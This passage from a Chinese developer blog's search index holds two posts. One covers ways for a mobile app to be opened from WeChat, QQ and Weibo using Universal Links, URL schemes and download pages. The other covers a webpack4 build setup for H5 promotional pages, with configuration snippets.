    <content type="text"><![CDATA[图片来源 为了向我们的APP导流，一些分享出去的页面和大部分的活动页我们希望能够直接由其他平台（微信、QQ、微博、浏览器）等直接唤起我们的APP。但是其他平台更多的是希望用户停留在自己平台内，进而阻止用户唤起第三方APP的操作。 两种意愿的冲突引发了平台APP和第三方APP在唤起功能中的博弈。对于我们第三方APP，如何才能在这场博弈中获得最优解呢？ 没有银弹，只有针对各种平台的导弹由于各个平台对唤起行为的封锁方式不同，以及我们业务高频需求场景不同，需要针对不同平台做特殊处理。 针对两个系统和4个高频平台做分析。（为了简化流程，这里我们只针对三个平台做分析，其他平台分析思维类似） IOSios &gt;= 9.0 支持新的 Universal Links 唤起协议，这里我们简称 link 协议，不清楚的请自行 google。大部分平台也支持。 微信禁了 link 协议，使用 link 链接依然无法唤起 APP，但是我们可以将 link 链接对应到一个下载页，引导用户 Safari 打开，当用户点击 Safari 打开的时候直接触发 link 协议，进而直接唤起 APP。⚠️ 这里是直接唤起 APP，不需要经过 Safari 中转。 微博、QQ、Safari 都是没有禁用 link 协议的，可以直接使用。 针对默写禁用 link 协议浏览器可以尝试使用 schema 唤起协议。 有些平台不支持直接跳 App Store，需要通过 itunes 平台 https://itunes.apple.com/cn/app + url Anroidandroid 唤起使用 schema 协议。 android 微信没有 link 协议可以使用，可以实现一个下载页，在下载页面引导用户浏览器打开，用户通过浏览器打开的时候直接触发唤起脚本。相比于 ios 微信，唤起过程中间多了一层浏览器中转（具体看浏览器实现，有些浏览器有弹窗让用户确认是否唤起 APP ） 对于禁用 schema 协议的平台来说都可以采用针对微信的方案。 没有禁用 schema 协议的直接使用 schema 协议就好。 其他有些应用在微信能够直接唤起 APP，是因为这些公司与微信有深度合租关系，在微信白名单内。 有些应用在微信能通过应用宝唤起 APP，是因为在应用宝上，他们的应用满足下面四个条件之一（可以申请 APP link) 应用评级达到A级； 应用微下载日访问量达到10W/天； 项目/应用参加腾讯“双百”扶持计划； 应用由腾讯投资占股。 如何您的应用符合上面四个条件之一，可以使用如下形式拼接 url: http://a.app.qq.com/o/simple.jsp?pkgname=com.xx.abc&amp;android_schema=appname://a/b?url=https://www.a.com/b/c.html 为什么要使用下载页面？可能会有同学问，上文唤起流程图，唤不起的之后的下载流程为什么走下载页，而不是直接下载。考虑到两个因素： 平台差异化严重，笔者暂没找到合适的办法，判断用户是否唤起 APP 成功，如果用户唤起成功还让用户下载是非常不好的体验。（如果你们有更好的方案，欢迎下方留言） 将唤起下载逻辑统一封装一个下载|唤起模块易于代码的维护和管理。]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>唤起</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack4 H5活动页构建]]></title>
    <url>%2Fwebpack4%E6%B4%BB%E5%8A%A8%E6%9E%84%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[由于公司的H5活动页构建老旧，存在一系列问题，于是萌生了用 webpack4 重写整个构建的想法，在此记录下遇到的问题与对应的解决方案。 ⚠️ 本文不涉及 webpack4 配置的基础知识！ 目标 支持单页和多页 支持开发时的热更新 构建过程可配置 支持接口 mock 支持 es6 语法 弹性设配移动端屏幕 目录结构 |-- lib 活动专用 js 脚本 |-- thirdsrc 第三方代码库 |-- build 构建脚本 |-- mock mock 数据 |-- template 模版 |-- css |-- js |-- entry 入口文件，处理一些公用逻辑 |-- img |-- view.html 依赖的第三方库zepto引入 zepto 是为了提高 dom 的操作效率，并且符合团队人员的开发习惯。为了不让基础依赖库过大，只引入了 zepto 中的 zepto、event、ajax 三个模块。 没有考虑使用 vue、react 等框架的原因：虽然引入第三方框架，能够更好的复用代码，降低开发人员开发切换开发代价，但是会引入一个更大的问题，依赖基础包太大了，在用户网络不好的情况下，及其影响用户体验。为了一个活动页，引入这么重的框架不值得。如果 vue3.0 实现它的目标，压缩后只有 10k，那么是一个非常好的选择。 fastclick由于我们的代码还要运行在 ios 老的 webview 上，依然会有 click 延迟 300ms 问题，因此引入这个基础库。 引入方式12import '/path/to/fastclick';import '/path/to/zepto'; 图片问题图片是前端不可忽视的重资源问题，尽管图片解析渲染非常快（相比同等大小的js）。但是过大的图片会导致页面有段空白期，甚至出现页面抖动，造成非常糟糕的用户体验。 大图片 使用 image-webpack-loader 进行图片的压缩 在 CDN 上存储.png 和 .webp 两种格式的图片，客户端判断能用webp 就用 webp（判断是否支持 webp 需要一定的时间，可将判断结果持久化存储在本地），或者直接在 CDN 实现。如果产品运行在 webview 可以引入基础库，直接对 webp 进行支持。 小图标svg 在移动端支持的非常好了，搭配 http/2，跑的飞起，没有理由不用。虽然在 android &lt;= 4.3 会将 svg 转换成非矢量图在渲染，但是看看你的应用在 android &lt;= 4.3 有多少用户量吧。 CSS直接上 postcss，能将 px 转换成 rem，能 autoprefixer(还能根据需要兼容的浏览器进行配置，当然更好的方式是使用 .browserslistrc，这才是业界标准)，能压缩 cssnano。 Normalize.css 当然不能少normalize.css JS动态 polyfill由于大部分用户用的都是“现代”手机，因此大部分 polyfill 对于大部分用户来是不需要的。可以自己搭服务器实现类似 polyfill.io 的功能。具体性能优势，传送门 编译成 es+同样，对于大部分用户是能运行 es6 的，所以不必将所有代码编译成 es5。可以编译成两套代码，一套 es6，一套 es5 用于兼容底端设备。具体方案，传送门 Webpack下面通过代码直接分析遇到的问题。 html由于我们的需求比较简单，使用 html-webpack-plugin 能解决我们的单页多页问题。 处理 html 重的图片： 使用 html-loader html 热更新，在 entry 文件，加入： 1234if (process.env.NODE_ENV === 'development') &#123; require('path/to/html')&#125; CSS由于我们是活动页，比较适合将 css 注入 style 标签中，实现方式如下： mini-css-extract-plugin 提取 css style-ext-html-webpack-plugin 将提取的 css 注入 html 文件 ⚠️ mini-css-extract-plugin 插件要在 style-ext-html-webpack-plugin 之前 123456789101112131415161718192021222324252627282930313233343536373839// 提取多个文件 css 的 webpack 配置function generaterStyleChunk() &#123; const styleChunk = &#123;&#125;; for (let page of config.pages) &#123; styleChunk[page + 'style'] = &#123; name: page, test: (m,c,entry = page) =&gt; m.constructor.name === 'CssModule' &amp;&amp; recursiveIssuer(m) === entry, chunks: 'all', enforce: true &#125; &#125; return styleChunk;&#125;// 需要注意的是，不能将 css 打包进 js 中&#123; optimization: &#123; minimize: true, runtimeChunk: 'single', splitChunks: &#123; cacheGroups: Object.assign(&#123; common: &#123; test(module, chunks) &#123; const result = module.type === 'javascript/auto' &amp;&amp; /\/node_modules\//.test(module.context); if (!result) &#123; console.log(module.type); console.log(module.context); &#125; return result; &#125;, name: 'common', chunks: 'initial', priority: 2, minChunks: 2, &#125; &#125;, generaterStyleChunk()) &#125; &#125;&#125; 保证chunk 名字变动最小123456789new webpack.NamedChunksPlugin((chunk) =&gt; &#123; const hashChunk = () =&gt; &#123; return md5(Array.from(chunk.modulesIterable, (m) =&gt; &#123; return m.identifier(); &#125;).join()).slice(0, 10); &#125; return chunk.name ? chunk.name : hashChunk() &#125;),new webpack.HashedModuleIdsPlugin(), 其他问题支持 async/await 需要 @babel/plugin-transform-runtime 分析代码输出 webpack-bundle-analyzer 分析 babel，debug: true 总结你需要明白，想要构建成什么样，能用资源有哪些，可以做到什么地步。然后一步步分析，实现你想要的模样。]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
        <tag>活动</tag>
      </tags>
  </entry>
</search>
